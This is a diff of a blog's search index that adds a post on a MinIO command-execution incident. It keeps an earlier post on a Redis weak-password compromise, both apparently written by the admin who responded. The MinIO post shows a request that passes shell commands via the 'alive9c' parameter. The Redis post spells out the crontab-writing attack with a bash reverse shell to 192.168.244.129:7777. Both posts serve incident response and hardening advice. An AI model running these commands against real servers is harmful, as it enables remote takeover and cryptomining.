@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Minio Webrce漏洞]]></title>
+    <url>%2Fblog%2F2023%2F05%2F03%2FMinio-Webrce%E6%BC%8F%E6%B4%9E%2F</url>
+    <content type="text"><![CDATA[Minio web应用命令执行（Webrce）漏洞20230502，五一期间，人在家中坐，祸从天上来。 背景公司上任架构师在阿里云搭建了包含三个节点的Minio集群作为OSS服务，接手后基本就是巡查一下然后定期更新版本，偶尔磁盘空间不足的话扩容一下，一切都是那么平稳且无趣。 问题发现 20230502 11:09:33，阿里云云安全中心发出安全告警，提示“Web应用命令执行，异常网络流量”。具体如下图 问题分析从上面第二张图可以看到，攻击方式非常的朴实无华，攻击方利用python的requests包向minio集群发起了一个特殊的GET请求，然后居然就能通过minio这个父进程调用shell命令，直接执行了whoami这个命令。 乍见感到十分惊讶，这样简单的方式居然就能攻破minio集群，网上搜索一番，没有相关资料，尤其是minio源码或者文档里完全没有提及有这么个请求地址 http://{minio地址}:{minio端口}/?alive9c={shell命令}。 遂决定自己试试，以下是随手编写的python代码123import requestsr=requests.get("http://&#123;minio地址&#125;:&#123;minio端口&#125;/?alive9c=pwd")print(r.content) 结果令人惊讶，居然真的就获得了minio的路径，而且通过这个方式基本可以执行minio用户下所有有权限执行的shell命令，如果安装minio时用户名密码是通过环境变量或者配置文件设置的话，很简单的shell命令就可以获取到minio的管理账号。 问题解决刚发现问题时，第一步其实是阻断攻击者的ip访问，到云服务器ECS的网络安全组中，先设置访问规则，将所有来自该ip的访问阻断。 然后就开始搜索相关资料，试图找到相关信息看如何针对性地修补该漏洞。 遗憾的是，minio源码或者文档里完全没有提及有这个导致问题的请求地址是做什么的，思考一番决定尝试更新minio版本解决此问题。 利用下面的命令，先查看minio集群目前的版本，然后尝试更新：12mc admin info myminiomc admin update myminio 发现问题：”Server myminio already running the most recent version of MinIO” 再看minio版本居然是development，具体如下图： 具体为何会更新至这个版本已经不可追溯，但是minio集群因为这个问题会一直停滞在这个development版本而不更新，怀疑出问题的地址就是仅用于开发或者之前某个版本被人恶意下毒，然后在利用mc admin update 时更新到了这个有问题的版本，然后就被利用了这个漏洞。 于是，手动更新mc(客户端)与minio（服务端）： 获取官方源上最新版本的二进制文件： 12wget https://dl.min.io/server/minio/release/linux-amd64/miniowget https://dl.min.io/client/mc/release/linux-amd64/mc 停止minio服务，并备份原二进制文件： 1234systemctl stop miniocd &#123;minio安装目录&#125;/binmv minio minio.bakmv mc mc.bak 3.将下载好的文件放到minio的bin目录下替换原有二进制文件4.修改文件属性(组、所有者、可执行): 123chmod a+x miniochmod a+x mcchown minio.minio minio 5.重启minio并观察服务状态:12systemctl start miniosystemctl status minio 最后再次利用之前的python脚本请求有问题的地址，发现已经不可执行shell命令了，此问题解决。 经验总结 阿里云的云安全服务是个好东西，这个钱不能省； 开源的东西问题多，其实建议换成熟云服务商提供的OSS服务，不要自己折腾； 有的更新可能会导致问题，不要瞎更新； 发现攻击可以先阻断攻击路径，切他网线和ip，后面再慢慢解决漏洞； 还好运行minio的权限不是root，再次警示不要所有服务都运行在root账号上。 Todo都提到了minio，后续有空写一下如何搭建minio集群与如何为minio集群动态扩容，还有一些minio的使用注意事项与demo]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>安全</tag>
+        <tag>minio</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Redis配置不当致使Root被提权漏洞]]></title>
     <url>%2Fblog%2F2023%2F03%2F18%2FRedis%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E8%87%B4%E4%BD%BFRoot%E8%A2%AB%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2F</url>
     <content type="text"><![CDATA[Redis配置不当致使Root被提权漏洞记录一下一次补漏洞的经历，难得有这么经典的案例 背景公司和某银行之间有些合作，委托银行部署了一个专门用于收罚款的程序。公司出服务器（阿里云ECS），银行出应用，因为公司毕竟是大客户，银行也没提收钱的事情，就这么免费帮忙部署了这么个应用。 当然有人占了银行的便宜，那么有人就要被银行占便宜，谁是这个倒霉的人呢，他就是银行外包。于是这个应用的开发和部署都是银行外包搞定的，当时和外包对接的老哥提了必须基于docker部署该应用，方便以后迁移到k8s。 然后好玩的来了，对于老哥的要求，外包公司很配合。一个基于nutz框架写的java应用，打包成jar包以后，docker build&amp;docker run。然后这应用需要redis\mysql\nginx这些基础设施，于是从网上copy了几个docker-compose文件，分别docker-compose up,暴露所有需要的端口即可。 理论上来说，这些东西全放在一个docker-compose文件内，或者共用一个docker网络，也无需向外暴露接口，当时负责对接的老哥也没仔细审核，于是就埋下了隐患。 问题发现 2023-03-17 17:39:40 ，阿里云云安全中心发出安全告警，提示“Redis配置不当致使Root被提权漏洞”； 攻击溯源如下图： 操作文件中看到： 问题分析从上面的提示来说，问题其实很明显，黑客是通过redis的提权漏洞获取到了系统的root权限然后在cron定时任务里放东西了，一般来说都是挖矿脚本之类。黑客通过redis的提权漏洞获取到的其实是docker容器内的root权限，所以设置的定时任务应当也是在docker容器内，影响范围其实控制在了容器内。 果不其然，进入redis容器内，查看定时任务，看到了被恶意写入的挖矿脚本。 123docker exec -it redis shcd /var/spool/cron/cat root 结果如下： 随便百度一下，属于是老面孔了： 问题解决最简单的处理方法当然就是销毁被黑的redis容器然后重起一个，无非就是docker-compose down和up的事情，这些恶意写入的脚本只要没有存在docker持久化的文件系统内,自然就会销毁。 但是，如果只是简单重启一下容器，后面再来同样的攻击咋办，因此需要找到防御薄弱造成问题的地方进行修补。 能通过redis提权，说明攻破了redis，简单看一下redis设置，果然发现两个问题： 默认端口6379，明摆着告诉黑客，我是redis,欢迎光临； 打开redis.conf一看，redis弱密码，1qaz@WSX，非常经典，暴露破解密码字典里的常客； 大概能够回溯出黑客的攻击路径了： 扫描服务器端口，找到redis的6379端口 暴力破解尝试连接redis 连接成功后，通过redis写入计划任务，具体方式应当是这样的： 在数据库中插入一条数据，将计划任务的内容作为value，key值随意， 通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell,可以参照下面的命令执行 12345redis-cli -h 192.168.1.2 -p 6379set xxx "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.244.129/7777 0&gt;&amp;1\n\n"config set dir /var/spool/cron/crontabs/config set dbfilename rootsave 目前最低成本的修补漏洞的方法： 修改默认端口 修改弱密码 设置防火墙安全策略 于是就这么简单处理了下然后联系外包公司修改他们应用里的配置，实际上除了上面两项，最好处理的办法是： redis容器如无必要，不对外开放端口，在容器内可以用docker network通信； 配合防火墙安全策略（如iptables）限制连接，指定能够访问redis服务的ip; 降权：以低权限运行 Redis 服务 禁止使用root权限启动redis服务 不过考虑到和外包协调的问题，还有不要对正在运行的应用的框架进行大改导致业务宕机，故先临时解决，后续再规划整改。 经验总结 阿里云的云安全服务是个好东西，这个钱不能省； 应用部署在docker容器里其实也变相增加了安全性，如果被黑，影响范围能够小一些； 能不向外暴露的端口就不要向外暴露； 能不用默认端口地址的就不要用； 别用弱密码甚至不设密码； 权限够用即可，别啥都是root权限; 部署上线前要严格审核（尤其是这种不要钱的外包帮忙做的）； 防火墙安全策略是个好东西，尽可能设置安全策略限制ip访问；]]></content>
@@ -75,8 +87,8 @@
         <category>项目</category>
       </categories>
       <tags>
-        <tag>项目</tag>
         <tag>小工具</tag>
+        <tag>项目</tag>
       </tags>
   </entry>
   <entry>
@@ -87,8 +99,8 @@
         <category>项目</category>
       </categories>
       <tags>
-        <tag>项目</tag>
         <tag>小工具</tag>
+        <tag>项目</tag>
       </tags>
   </entry>
   <entry>
